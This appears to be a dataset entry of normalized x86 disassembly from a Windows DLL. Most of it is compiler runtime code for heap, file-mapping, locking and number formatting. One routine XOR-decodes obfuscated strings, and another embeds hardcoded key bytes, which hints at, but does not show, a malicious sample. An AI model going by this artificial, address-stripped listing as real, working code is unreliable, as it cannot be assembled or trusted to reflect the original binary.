mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x208
lea eax [ ebp - 0x258 ]
mov ebx ecx
push 0x0
push eax
mov [ ebp - 0x268 ] ebx
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x258 ]
call sub_10048a90
test eax eax
je r-xdata
mov esi [ ebx ]
lea edi [ ebp - 0x25c ]
call sub_1000d540
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xb2
call sub_10013830
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx [ ebx ]
xor eax eax
lea ecx [ ebp - 0x260 ]
push ecx
lea ecx [ ebp - 0x264 ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x264 ] eax
call sub_1001b560
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xa2
call sub_10013830
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x264 ]
lea ecx [ ebp - 0x260 ]
call sub_1003c110
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x10d
call sub_10013830
mov [ ebp - 0x25c ] 0x3
mov edx [ ebp - 0x264 ]
mov eax [ ebp - 0x260 ]
push edx
push eax
lea eax [ ebp - 0x258 ]
call sub_10031770
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xe9
call sub_10013830
mov [ ebp - 0x25c ] 0x4
jmp r-xdata
mov esi [ ebp - 0x25c ]
lea edx [ ebp - 0x50 ]
mov eax 0x138
call sub_10013830
mov esi 0x6
jmp r-xdata
mov ecx [ ebp - 0x268 ]
mov esi [ ecx ]
call sub_1001d390
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x138
call sub_10013830
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x260 ]
test eax eax
je r-xdata
sub_1003bb2a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10078db0
add esp 0xc
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_1003bb80
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push esi
push 0x0
mov [ ebp - 0x3c ] eax
call sub_100248f0
mov eax [ esi ]
add esp 0x10
push 0x0
push eax
push 0x0
push 0x4
push 0x0
push 0xffffffff
call [ CreateFileMappingW@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov ecx [ esi ]
push ecx
push 0x0
push 0x0
push 0xf001f
push edi
call [ MapViewOfFile@IAT ]
mov [ ebx ] eax
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
push ecx
push esi
push eax
call sub_100248f0
mov edx [ ebx ]
mov esi [ ebp - 0x3c ]
mov [ ebp - 0x34 ] edi
add esp 0x10
add esi 0xd4
lea edi [ ebp - 0x38 ]
mov [ ebp - 0x38 ] edx
call sub_100589c0
push eax
push esi
lea esi [ ebp - 0x38 ]
call sub_1004c020
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
lea edx [ ebp - 0x30 ]
mov eax 0x62
call sub_10060ac0
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
sub_1003bc70
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1003bcad
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1005ec92
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1003bd9b
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1004c42d
pop ecx
sub_1003bcfa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10043f7b
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1003bd40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
jl r-xdata
cmp eax 0xb
je r-xdata
cmp eax 0x8
jle r-xdata
mov eax 0x1
pop ebp
retn
cmp eax 0xe
jl r-xdata
cmp eax 0x7f
jl r-xdata
cmp eax 0x1f
jle r-xdata
cmp eax 0xfdd0
jl r-xdata
cmp eax 0x9f
jle r-xdata
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp eax 0xfdef
jle r-xdata
cmp eax 0xffff
je r-xdata
xor eax eax
pop ebp
retn
sub_1003bd9b
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1003be4d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005296
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1003be70
push edi
mov edi eax
cmp edi esi
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_10019180
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
push 0xffffffff
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push 0x0
add edi 0x70
push edi
lea ecx [ esi + 0x70 ]
mov [ esi + 0x6c ] eax
call sub_10019180
sub_1003bef0
push ebp
mov ebp esp
push 0xffffffff
push sub_100822c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_100312a0
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
test edx edx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
mov edx edi
[ ecx ] edx
jne r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
[ eax ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1003c06a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1003c110
push ebp
mov ebp esp
push 0xffffffff
push sub_100805a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x4
xor ebx ebx
push ebx
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push 0x1c
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_100264c0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1003c2a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
push edi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
cmp [ ebp - 0x4 ] edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
cmp eax ecx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x4 ] eax
ja r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax ecx
mov ecx [ ebx ]
call sub_10020610
mov edi [ esi + 0x4 ]
add esp 0x4
call sub_10020290
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
mov ecx [ esi ]
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
lea eax [ eax + eax * 8 ]
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10039be0
mov edi [ esi + 0x4 ]
add esp 0x8
mov ebx eax
call sub_10020290
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov edx [ ebx ]
lea eax [ edi + edi * 8 ]
lea edi [ edx + eax * 4 ]
mov eax ecx
push edi
mov ecx edx
call sub_10020610
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ebx [ ebx + 0x4 ]
push ecx
push eax
push ebx
mov ecx edi
call sub_10001540
add esp 0x10
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add edi edx
call sub_10052810
test al al
je r-xdata
mov edi [ esi + 0x4 ]
mov eax ecx
call sub_10020290
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
mov edi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
push edi
push eax
push edx
call sub_10001540
add esp 0xc
mov [ esi + 0x4 ] eax
sub_1003c41b
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10017fab
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1003c5db
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
push esi
call sub_10022b5a
pop ecx
sub_1003c644
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1003c66c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_1001a053
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c691
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004dca7
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1003c700
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
mov eax [ ecx + 0x10 ]
and eax [ ecx + 0xc ]
mov esi 0x1
test al 0x4
je r-xdata
push 0x0
push 0x0
call sub_1000bd19
test al 0x2
je r-xdata
call sub_100080fc
mov edi eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] r--data
call sub_10008757
push r--data
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1000bd19
call sub_100080fc
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0x8 ] r--data
call sub_10008757
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1000bd19
int3
call sub_100080fc
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0x8 ] r--data
call sub_10008757
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1000bd19
sub_1003c7d0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x5c
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_1003c7fc
push 0x80
mov eax sub_1007f81d
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1001fccb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1003088d
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_100680bc
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_10079480
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_10079480
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10067f90
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_10044159
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
